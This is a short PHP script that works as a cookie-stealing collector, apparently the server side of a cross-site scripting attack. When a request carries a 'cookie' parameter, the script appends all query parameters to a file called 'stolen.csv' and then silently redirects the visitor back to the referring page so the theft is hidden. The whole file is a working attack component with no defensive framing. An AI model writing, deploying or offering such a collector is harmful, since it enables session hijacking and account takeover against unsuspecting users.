<?php
if(isset($_GET) && isset($_GET['cookie'])) {
	$fp = fopen('stolen.csv', 'a');
	fputcsv($fp, $_GET);

    $location = $_SERVER['HTTP_REFERER'];
    header("Location: $location");
}
?>
